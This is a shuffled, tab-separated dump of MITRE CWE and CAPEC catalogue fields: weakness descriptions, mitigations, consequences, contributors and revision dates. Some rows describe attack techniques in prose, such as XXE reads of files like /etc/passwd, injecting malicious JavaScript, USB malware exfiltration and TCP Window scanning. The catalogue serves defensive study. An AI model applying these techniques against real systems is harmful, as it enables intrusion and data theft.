14192	68	This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
18274	42	Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.                   For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.                   Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:                                                                  HTML body                         Element attributes (such as src="XYZ")                         URIs                         JavaScript sections                         Cascading Style Sheets and style property                                                            etc. Note that HTML Entity Encoding is only appropriate for the HTML body.                   Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.
19642	35	Cigital
7827	62	updated Common_Consequences
22037	28	CWE Content Team
7524	26	Architecture and Design
12753	69	Draft
8123	61	Draft
7042	56	CanPrecede
8125	91	Implementation
8802	43	Simple
17512	42	Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.
8249	85	304
18306	28	CWE Content Team
14717	35	MITRE
25192	56	ChildOf
9841	50	Limit the sites that are being added to the local machine zone and restrict the privileges of the code running in that zone to the bare minimum
13666	55	CAPEC Content Team
8708	81	Confidentiality
13022	35	MITRE
6710	59	Updated Attack_Prerequisites, Description, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations
24612	103	Primary
19529	100	The MITRE Corporation
11775	35	MITRE
14148	24	MITRE
13361	35	MITRE
19279	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
9683	92	Exploit
23145	51	2014-06-23
6149	39	2017-11-08
12299	32	Sigcomm
15531	90	Language-Independent
11689	59	Updated @Abstraction, Related_Attack_Patterns
22483	39	2017-01-19
8419	39	2008-07-01
9313	74	1
18722	46	XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.             By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as "file:///c:/winnt/win.ini" designates (in Windows) the file C:\Winnt\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.             Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.
10106	39	2013-07-17
23998	39	2019-01-03
20328	39	2008-09-08
18164	100	The MITRE Corporation
5909	28	CWE Content Team
22332	35	MITRE
12696	35	MITRE
7733	56	ChildOf
20394	23	The application stores sensitive information in cleartext within a resource that might be accessible to another control sphere.
17613	62	updated Observed_Examples, References, Relationships
12072	91	Architecture and Design
8177	89	Detailed
18356	50	Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.
16491	62	updated Potential_Mitigations
21847	62	updated Common_Consequences
6708	31	1000
22658	28	CWE Content Team
12529	62	updated References, Relationships
16208	76	2015-12-07
25107	39	2011-06-01
23488	39	2008-07-01
11897	50	Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.
10123	28	CWE Content Team
14411	61	Draft
8106	26	Implementation
14480	39	2008-07-01
11127	40	Administrator permissions are required to view the home folder of other users.
16623	74	1
6174	27	A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.
10279	79	Access Control
12190	76	2018-07-31
20691	44	High
20352	21	PLOVER
6184	35	MITRE
24373	22	01
23044	78	High
12052	96	2018-07-02
14872	78	Low
24115	39	2009-07-27
15822	35	MITRE
10550	31	1000
8282	101	CAPEC Content Team
6284	50	Do not rely solely on user-controllable locations, such as cookies or URL parameters, to maintain user state.
10234	39	2012-10-30
8114	62	updated Relationships, Taxonomy_Mappings
21769	35	MITRE
20147	35	MITRE
22857	76	2018-07-31
19883	62	updated Description, Other_Notes
22354	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
9949	35	MITRE
23071	91	Implementation
11939	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
17407	90	C
19410	49	2002
14285	101	CAPEC Content Team
9856	100	The MITRE Corporation
16888	62	updated References, Relationships
24808	28	CWE Content Team
5589	42	Catch all relevant exceptions. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment.
12991	39	2008-07-01
6992	56	ChildOf
10281	102	CanPrecede
6230	63	Gain Privileges or Assume Identity
20010	35	MITRE
9980	51	2014-06-23
5588	40	An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.
5984	28	CWE Content Team
10751	56	ChildOf
17877	23	The software uses a signal handler that introduces a race condition.
24769	28	CWE Content Team
5583	48	04
13764	72	In the case of an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences.
21982	40	The adversary must be able to intercept a message from the sender (keeping the recipient from getting it), modify it, and send the modified message to the recipient.
19019	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.
20564	59	Updated Related_Weaknesses
17973	61	Draft
22079	55	CAPEC Content Team
18799	47	Bypass Protection Mechanism
14576	35	MITRE
24561	103	Primary
20086	35	MITRE
25353	62	updated Description, Other_Notes, Potential_Mitigations
22860	92	Explore
19920	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis
24057	62	updated Common_Consequences
14538	63	Bypass Protection Mechanism
22611	56	ChildOf
8270	28	CWE Content Team
19905	28	CWE Content Team
19877	62	updated Detection_Factors, Relationships
20545	101	CAPEC Content Team
23110	39	2010-02-16
24399	27	None: No specialized resources are required to execute this type of attack.
8592	28	CWE Content Team
10047	55	CAPEC Content Team
22663	62	updated Related_Attack_Patterns
13603	31	1000
18345	39	2010-09-27
15087	59	Updated Related_Weaknesses
9038	102	ChildOf
19474	35	MITRE
8204	39	2011-06-01
12449	28	CWE Content Team
17748	35	MITRE
24780	43	Simple
17697	46	When an indexing routine is applied against a group of private documents, and that index's results are available to outsiders who do not have access to those documents, then outsiders might be able to obtain sensitive information by conducting targeted searches. The risk is especially dangerous if search results include surrounding text that was not part of the search query. This issue can appear in search engines that are not configured (or implemented) to ignore critical files that should remain hidden; even without permissions to download these files directly, the remote user could read them.
16011	62	updated Relationships
12301	79	Accountability
18017	56	CanPrecede
7852	31	1000
12990	28	CWE Content Team
17151	56	CanPrecede
21681	26	Implementation
20940	63	Modify Files or Directories
10805	88	Comparison of Classes by Name
9201	103	Primary
11706	85	534
17527	73	Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.
5998	91	Implementation
20151	28	Eric Dalci
22543	86	http://diniscruz.blogspot.com/2010/09/can-we-please-stop-saying-that-xss-is.html
15428	66	C Language Issues for Application Security
13785	74	1
11994	62	updated Description, Name
7856	55	CAPEC Content Team
9621	39	2012-10-30
17993	39	2008-09-08
20152	28	CWE Content Team
8163	53	The MITRE Corporation
15836	48	11
7922	35	MITRE
13193	88	Integer Underflow (Wrap or Wraparound)
10622	54	Low
15084	45	Base
19177	43	Simple
11091	45	Class
18031	28	CWE Content Team
23907	28	CWE Content Team
12637	50	Implementation: Use products that are Alternate Data Stream aware for virus scanning and system security operations.
24696	39	2009-05-27
24108	28	CWE Content Team
8418	45	Base
21049	23	An adversary loads malicious code onto a USB memory stick in order to infect any system which the device is plugged in to. USB drives present a significant security risk for business and government agencies. Given the ability to integrate wireless functionality into a USB stick, it is possible to design malware that not only steals confidential data, but sniffs the network, or monitor keystrokes, and then exfiltrates the stolen data off-site via a Wireless connection. Also, viruses can be transmitted via the USB interface without the specific use of a memory stick. The attacks from USB devices are often of such sophistication that experts conclude they are not the work of single individuals, but suggest state sponsorship. These attacks can be performed by an adversary with direct access to a target system or can be executed via means such as USB Drop Attacks.
14206	104	427
9217	39	2008-09-08
11344	33	OWASP
9602	31	1000
24656	91	Implementation
7224	51	2014-06-23
21293	28	CWE Content Team
23026	35	MITRE
10222	62	updated Relationships
22970	39	2008-10-14
17160	35	MITRE
13644	35	MITRE
11590	39	2009-05-27
15575	53	The MITRE Corporation
7204	28	CWE Content Team
17499	77	Architecture or Design Review
19862	76	2015-12-07
12531	101	CAPEC Content Team
12051	28	CWE Content Team
8582	36	http://www.thesecuritypractice.com/the_security_practice/TransparentProxyAbuse.pdf
21964	66	Use of A Taxonomy of Security Faults
21313	62	Suggested OWASP Top Ten 2004 mapping
7851	28	CWE Content Team
9721	28	KDM Analytics
10489	66	Java: The Complete Reference, J2SE 5th Edition
17037	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
24870	23	The software compares two entities in a security-relevant context, but the comparison is incorrect, which may lead to resultant weaknesses.
6980	62	updated Description
19027	39	2012-05-11
14665	35	MITRE
12327	31	699
19491	81	Integrity
23095	59	Updated Related_Weaknesses
11565	28	CWE Content Team
20097	31	699
5674	28	CWE Content Team
15558	101	CAPEC Content Team
18895	35	MITRE
9466	39	2017-11-08
12551	90	Language-Independent
17670	91	Operation
9995	102	ChildOf
20412	50	Implementation: Perform output validation for all remote content.
22045	28	CWE Content Team
22691	33	Amit Klein
8996	35	MITRE
10741	35	Cigital
10974	45	Variant
10844	39	2011-09-13
9834	46	The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has been protected. Well-known techniques may exist to break the algorithm.
17741	28	Eric Dalci
16383	39	2019-01-03
7857	74	3
23386	51	2014-06-23
6545	35	MITRE
16145	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
17908	28	CWE Content Team
14192	42	Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.                   For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.
12390	51	2014-06-23
6440	35	MITRE
6097	62	updated Relationships
23409	28	CWE Content Team
23507	31	699
10430	35	MITRE
18765	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
7643	31	1000
14787	47	Hide Activities
19093	76	2018-07-31
5877	96	2018-07-02
14217	35	MITRE
12557	35	MITRE
14161	62	updated Detection_Factors, References, Relationships
24472	35	MITRE
22653	35	MITRE
15014	62	updated Relationships, Taxonomy_Mappings
12058	62	updated Potential_Mitigations
20412	89	Detailed
15214	56	ChildOf
14664	99	SANS Software Security Institute
17446	39	2012-10-30
8846	95	[Probe for ORM Injection vulnerabilities] The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content.
6121	28	CWE Content Team
16193	62	updated References
5786	63	Modify Application Data
10088	39	2008-07-01
10989	26	Architecture and Design
22091	35	MITRE
7574	47	Bypass Protection Mechanism
10840	28	CWE Content Team
14027	39	2014-07-30
22325	28	CWE Content Team
23545	35	MITRE
22897	35	MITRE
13754	88	Excessive Iteration
8063	69	Incomplete
12507	73	Use a spidering tool to follow and record all links.
17771	23	When a file is opened, its file handler is checked to determine which program opens the file. File handlers are configuration properties of many operating systems. Applications can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened.
9891	30	N.P. Smart
22588	57	Primary
23650	101	CAPEC Content Team
6349	90	Language-Independent
9299	31	1000
6595	35	MITRE
20683	91	Implementation
12422	90	JavaScript
14185	28	CWE Content Team
21922	95	The attacker overrides the variable and influences the normal behavior of the application server.
25343	35	MITRE
14717	28	CWE Content Team
19935	43	Simple
11479	90	Language-Independent
23881	58	Applications typically use log files to store a history of events or transactions for later review, statistics gathering, or debugging. Depending on the nature of the application, the task of reviewing log files may be performed manually on an as-needed basis or automated with a tool that automatically culls logs for important events or trending information.
15867	53	The MITRE Corporation
19899	81	Integrity
18204	81	Integrity
23466	35	MITRE
21692	78	High
22358	42	Use context-aware encoding. That is, understand which encoding is being used by the downstream component, and ensure that this encoding is used. If an encoding can be specified, do so, instead of assuming that the default encoding is the same as the default being assumed by the downstream component.
12527	62	updated References, Relationships
21181	50	Be aware of the threat of alternative method of data encoding.
22567	28	CWE Content Team
9532	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
8859	81	Non-Repudiation
21573	36	http://en.wikipedia.org/wiki/ARP_spoofing
16543	90	C#
8351	28	CWE Content Team
6660	62	updated Maintenance_Notes, Relationships, Other_Notes, Taxonomy_Mappings
9168	62	updated Time_of_Introduction
25380	35	MITRE
15971	42	Do not use a return statement inside the finally block. The finally block should have "cleanup" code.
16077	62	updated Relationships, Taxonomy_Mappings
9701	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
24644	39	2019-01-03
17073	26	Architecture and Design
20002	28	CWE Content Team
11712	100	The MITRE Corporation
16795	57	Resultant
7653	39	2012-05-11
6828	79	Access Control
9227	45	Variant
24370	59	Updated Related_Attack_Patterns
16835	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
8427	31	1000
6117	80	Exploiting a buffer overflow by injecting malicious code into the stack of a software system or even the heap can require a higher skill level.
18109	91	Implementation
19168	47	Read Data
15298	50	An organization should provide regular, robust cybersecurity training to its employees to prevent successful social engineering attacks.
15543	42	When using a critical resource such as a configuration file, check to see if the resource has insecure permissions (such as being modifiable by any regular user) [REF-62], and generate an error or even exit the software if there is a possibility that the resource could have been modified by an unauthorized party.
19219	31	1000
13283	60	11
6726	23	The product divides a value by zero.
10786	39	2009-01-12
6746	81	Confidentiality
8010	68	Performing extensive input validation does not help with handling unusual conditions, but it will minimize their occurrences and will make it more difficult for attackers to trigger them.
23182	62	updated Relationships
18759	28	CWE Content Team
14557	61	Stable
18006	62	updated Demonstrative_Examples, Observed_Examples, Relationships
24219	28	CWE Content Team
11214	46	When a resource is not properly locked, an attacker could modify the resource while it is being operated on by the software. This might violate the software's assumption that the resource will not change, potentially leading to unexpected behaviors.
23662	47	Read Data
9357	100	The MITRE Corporation
5624	85	604
19750	50	Make sure to protect client side authentication tokens for confidentiality (encryption) and integrity (signed hash)
22110	79	Confidentiality
17144	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, languages such as Java, Ruby, and Lisp perform automatic garbage collection that releases memory for objects that have been deallocated.
18897	62	updated Modes_of_Introduction, References, Relationships
22423	35	MITRE
10949	61	Draft
17498	28	CWE Content Team
8048	103	Primary
14345	28	CWE Content Team
20511	69	Incomplete
21189	46	Usage of short circuit evaluation, though well-defined in the C standard, may alter control flow in a way that introduces logic errors that are difficult to detect, possibly causing errors later during the software's execution. If an attacker can discover such an inconsistency, it may be exploitable to gain arbitrary control over a system.             If the first condition of an "or" statement is assumed to be true under normal circumstances, or if the first condition of an "and" statement is assumed to be false, then any subsequent conditional may contain its own logic errors that are not detected during code review or testing.             Finally, the usage of short circuit evaluation may decrease the maintainability of the code.
18130	35	MITRE
19051	63	Modify Application Data
13653	85	229
11271	62	updated Potential_Mitigations, References
11886	97	Code Inclusion
18723	35	MITRE
5753	70	Tip: Configure SAX parsers for secure processing
24649	39	2013-07-17
20925	39	2011-06-01
9508	88	Insufficient Control Flow Management
12679	39	2014-07-30
14637	39	2008-09-08
11028	46	Mishandling private information, such as customer passwords or Social Security numbers, can compromise user privacy and is often illegal. An exposure of private information does not necessarily prevent the software from working properly, and in fact it might be intended by the developer, but it can still be undesirable (or explicitly prohibited by law) for the people who are associated with this private information.             Privacy violations may occur when:                                                Private user information enters the program.                   The data is written to an external location, such as the console, file system, or network.                                          Private data can enter a program in a variety of ways:                                                Directly from the user in the form of a password or personal information                   Accessed from a database or other data store by the application                   Indirectly from a partner or other third party                                          Some types of private information include:                                                Government identifiers, such as Social Security Numbers                   Contact information, such as home addresses and telephone numbers                   Geographic location - where the user is (or was)                   Employment history                   Financial data - such as credit card numbers, salary, bank accounts, and debts                   Pictures, video, or audio                   Behavioral patterns - such as web surfing history, when certain activities are performed, etc.                   Relationships (and types of relationships) with others - family, friends, contacts, etc.                   Communications - e-mail addresses, private e-mail messages, SMS text messages, chat logs, etc.                   Health - medical conditions, insurance status, prescription records                   Credentials, such as passwords, which can be used to access other information.                                          Some of this information may be characterized as PII (Personally Identifiable Information), Protected Health Information (PHI), etc. Categories of private information may overlap or vary based on the intended usage or the policies and practices of a particular industry.             Depending on its location, the type of business it conducts, and the nature of any private data it handles, an organization may be required to comply with one or more of the following federal and state regulations: - Safe Harbor Privacy Framework [REF-340] - Gramm-Leach Bliley Act (GLBA) [REF-341] - Health Insurance Portability and Accountability Act (HIPAA) [REF-342] - California SB-1386 [REF-343].             Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.             Security and privacy concerns often seem to compete with each other. From a security perspective, all important operations should be recorded so that any anomalous activity can later be identified. However, when private data is involved, this practice can in fact create risk. Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted.
20960	28	CWE Content Team
18000	91	Implementation
14511	62	updated Potential_Mitigations
22777	39	2011-03-29
14028	28	CWE Content Team
16592	35	MITRE
5861	50	Implementation: Use SSL, SSH, SCP.
13564	62	updated Common_Consequences
7338	88	Client-Side Enforcement of Server-Side Security
18137	54	High
16260	103	Primary
17600	94	Denial of Service
21452	35	MITRE
11030	59	Updated Related_Weaknesses
6476	95	[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).
13474	39	2009-01-12
23768	79	Access Control
11431	28	CWE Content Team
8727	103	Primary
18110	25	Low
7986	44	High
7699	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19908	62	updated Relationships
7047	39	2011-06-27
19278	39	2010-02-16
16098	81	Access Control
12821	35	MITRE
7255	39	2012-10-30
12176	101	CAPEC Content Team
25298	26	Implementation
15564	79	Integrity
15576	39	2008-10-14
13120	28	CWE Content Team
15859	60	02
25187	21	PLOVER
12064	35	MITRE
16662	23	The software uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
21241	62	updated Applicable_Platforms, References, Taxonomy_Mappings
12387	62	updated Name, Related_Attack_Patterns
14197	28	CWE Content Team
23658	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
18432	61	Draft
8821	31	1000
12185	85	429
17541	23	An adversary engages in TCP Window scanning to analyze port status and operating system type. TCP Window scanning uses the ACK scanning method but examine the TCP Window Size field of response RST packets to make certain inferences. While TCP Window Scans are fast and relatively stealthy, they work against fewer TCP stack implementations than any other type of scan. Some operating systems return a positive TCP window size when a RST packet is sent from an open port, and a negative value when the RST originates from a closed port. TCP Window scanning is one of the most complex scan types, and its results are difficult to interpret. Window scanning alone rarely yields useful information, but when combined with other types of scanning is more useful. It is a generally more reliable means of making inference about operating system versions than port status.
5638	86	https://msdn.microsoft.com/en-us/library/ms885903.aspx
20523	88	Cleartext Storage of Sensitive Information in Executable
15782	28	CWE Content Team
17670	42	Set allow_url_fopen to false, which limits the ability to include files from remote locations.
21627	39	2008-09-08
8850	102	CanPrecede
11106	28	CWE Content Team
12895	61	Draft
16112	23	The product uses the wrong operator when comparing a string, such as using "==" when the equals() method should be used instead.
16645	28	CWE Content Team
24007	76	2018-07-31
6524	104	1174
21292	63	DoS: Resource Consumption (Other)
12122	76	2019-09-30
21812	46	An information exposure may occur if any of the following apply:                                                The WSDL file is accessible to a wider audience than intended.                   The WSDL file contains information on the methods/services that should not be publicly accessible or information about deprecated methods. This problem is made more likely due to the WSDL often being automatically generated from the code.                   Information in the WSDL file helps guess names/locations of methods/resources that should not be publicly accessible.
10962	35	MITRE
9628	28	CWE Content Team
19018	23	An adversary corrupts or modifies the content of XML schema information passed between a client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema. Possible attacks are denial of service attacks by modifying the schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the adversary removes this attribute from the schema then documents created using the new grammar may lack this field, which may cause the processing application to enter an unexpected state or record incomplete data. In addition, manipulation of the data types described in the schema may affect the results of calculations taken by the document reader. For example, a float field could be changed to an int field. Finally, the adversary may change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might us a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).
16793	39	2015-12-07
11348	97	Buffer Overflow via Symbolic Links
13067	51	2014-06-23
5811	62	updated Relationships
22519	28	CWE Content Team
8377	39	2008-10-14
12545	92	Explore
8976	39	2011-06-01
8297	28	CWE Content Team
9001	59	Updated Taxonomy_Mappings
15247	35	MITRE
5681	97	Provide Counterfeit Component
9874	80	To achieve a redirection and use of less trusted source, an attacker can simply place a script in bulletin board, blog, wiki, or other user-generated content site that are echoed back to other client machines.
12564	66	HMAC
15060	35	MITRE
11797	89	Detailed
21235	62	updated Applicable_Platforms, Relationships, White_Box_Definitions
21049	54	Low
24420	62	updated Common_Consequences, Demonstrative_Examples, Relationships
11108	62	updated Taxonomy_Mappings
9775	35	MITRE
21159	31	699
24332	46	When a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by using a man-in-the-middle (MITM) attack. The software might connect to a malicious host while believing it is a trusted host, or the software might be deceived into accepting spoofed data that appears to originate from a trusted host.
7977	35	MITRE
13698	79	Confidentiality
16183	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
18065	39	2009-07-27
19769	28	CWE Content Team
6464	56	ChildOf
8003	33	Jason Lam
22597	93	Defense in Depth
10240	51	2014-06-23
21226	42	Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
15888	35	MITRE
7834	28	CWE Content Team
21101	31	699
15595	90	Language-Independent
11722	24	MITRE
13637	53	The MITRE Corporation
8946	66	Top 25 Series - Rank 14 - Improper Validation of Array Index
9611	102	ChildOf
12836	56	ChildOf
23356	39	2012-05-11
24743	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings, Time_of_Introduction
13336	90	Language-Independent
9623	69	Stable
21228	26	Operation
8238	48	07
13847	62	updated Demonstrative_Examples, Potential_Mitigations
19621	69	Draft
21140	103	Primary
11105	35	MITRE
18990	28	CWE Content Team
10833	39	2012-05-11
7053	69	Incomplete
14533	39	2017-11-08
17867	103	Primary
9495	35	MITRE
19953	39	2018-03-27
18731	63	Execute Unauthorized Code or Commands
18588	104	374
6281	97	Sustained Client Engagement
21307	60	31
5638	60	13
19340	102	ChildOf
11795	33	Werner Haas
5894	39	2017-05-03
6803	81	Access Control
9284	28	CWE Content Team
13910	62	updated References
7141	26	Operation
17293	89	Detailed
10584	23	The software does not properly handle when the same input uses several different (mixed) encodings.
18183	39	2017-11-08
22996	62	updated Relationships
11708	62	updated Potential_Mitigations
23370	35	MITRE
24957	57	Primary
23798	35	Cigital
13975	35	MITRE
17317	35	MITRE
17810	28	CWE Content Team
6764	42	Use the ASP.NET validation framework to check all program input before it is processed by the application. Example uses of the validation framework include checking to ensure that:                                                                  Phone number fields contain only valid characters in phone numbers                         Boolean values are only "T" or "F"                         Free-form strings are of a reasonable length and composition
15008	91	Implementation
23843	35	Cigital
9949	28	CWE Content Team
10207	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Taxonomy_Mappings
13261	104	113
13551	39	2014-07-30
7288	62	updated Relationships, Taxonomy_Mappings
12509	63	DoS: Crash, Exit, or Restart
6183	28	CWE Content Team
19518	39	2012-05-11
24766	35	Cigital
9916	97	Electromagnetic Side-Channel Attack
25334	46	This issue suggests poor encapsulation and makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
24085	28	CWE Content Team
8308	45	Base
7692	100	The MITRE Corporation
15674	42	Adjust configurations appropriately when software is transitioned from a debug state to production.
16621	51	2014-06-23
7247	62	updated Description
18088	103	Primary
13655	32	Blackhat Briefings Asia 2001
23738	88	Off-by-one Error
22430	56	PeerOf
9030	80	Attacker knows how to send HTTP request, SQL query to a web application.
22875	91	Implementation
15271	76	2019-09-30
10635	28	CWE Content Team
10690	43	Simple
19315	35	MITRE
10882	35	MITRE
21161	39	2019-01-03
11236	88	Expression is Always True
9485	96	2008-09-09
23268	62	updated Potential_Mitigations, Relationships
6309	28	CWE Content Team
12259	61	Stable
10759	33	Michael Howard
13099	62	updated Time_of_Introduction
13023	23	The software uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme.
17454	35	MITRE
9964	103	Primary
19812	35	Cigital
6581	31	1003
25225	28	CWE Content Team
24901	103	Primary
20013	67	Medium
12161	28	CWE Content Team
8013	39	2012-05-11
6652	57	Indirect
7204	62	updated Relationships, Taxonomy_Mappings
15681	67	Medium
22504	102	ChildOf
18737	62	updated Applicable_Platforms, Detection_Factors, Relationships, Other_Notes, Weakness_Ordinalities
10488	57	Primary
7264	26	Implementation
10016	28	CWE Content Team
10955	79	Confidentiality
18105	96	2009-07-02
10536	31	1000
5753	32	IBM
8555	80	The attacker has to identify injection vector, identify the specific commands, and optionally collect the output, i.e. from an interactive session.
13724	81	Integrity
19397	28	CWE Content Team
9452	28	CWE Content Team
16753	61	Draft
11052	31	699
5863	62	updated Relationships, Taxonomy_Mappings
20981	62	updated Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References, Relationships
15182	35	MITRE
8980	92	Explore
24232	89	Standard
21656	62	updated Time_of_Introduction
15332	39	2015-12-07
24354	91	Architecture and Design
13864	56	ChildOf
21073	39	2017-11-08
8097	101	CAPEC Content Team
23880	62	updated Relationships
10579	86	http://homepages.di.fc.ul.pt/~nuno/PAPERS/ISSRE08.pdf
24029	62	updated Common_Consequences
7109	81	Integrity
14382	103	Primary
6036	39	2010-06-21
18511	89	Meta
9809	59	Updated Resources_Required
20344	36	http://www.sans.org/reading-room/whitepapers/threats/icmp-attacks-illustrated-477?show=icmp-attacks-illustrated-477&cat=threats
5770	88	Incorrect Pointer Scaling
18421	73	The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using "sleep(2)" and "usleep()" to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.
7618	63	DoS: Resource Consumption (Memory)
9098	62	updated Demonstrative_Examples, Relationships
7129	39	2010-12-09
21345	79	Availability
8941	53	The MITRE Corporation
14661	39	2012-10-30
22028	92	Exploit
15452	39	2012-10-30
21964	33	Taimur Aslam
12725	39	2017-01-19
23395	79	Availability
7788	62	updated Relationships
14625	62	updated Applicable_Platforms
6489	59	Updated Resources_Required
24990	35	MITRE
23565	28	CWE Content Team
5836	62	updated Relationships, Taxonomy_Mappings
18819	104	837
23981	56	PeerOf
9297	45	Variant
14754	28	CWE Content Team
10594	102	ChildOf
24368	88	Incorrect Control Flow Scoping
7603	62	updated Time_of_Introduction
12703	97	Browser Fingerprinting
15249	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
24938	50	The only known mitigation to this attack is to avoid installing the malicious application on the device. However, the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.
6115	35	MITRE
19101	35	MITRE
25104	39	2008-11-24
23622	88	Struts: Validator Without Form Field
18628	62	updated Relationships
24766	39	2008-07-01
19877	39	2014-07-30
24882	89	Detailed
8267	28	CWE Content Team
10970	62	updated Observed_Examples, Relationships
15855	35	MITRE
24854	62	updated Relationships, Taxonomy_Mappings
8414	39	2014-02-18
6604	28	CWE Content Team
22009	90	PHP
6068	39	2012-05-11
7501	60	11
21638	28	CWE Content Team
21585	35	MITRE
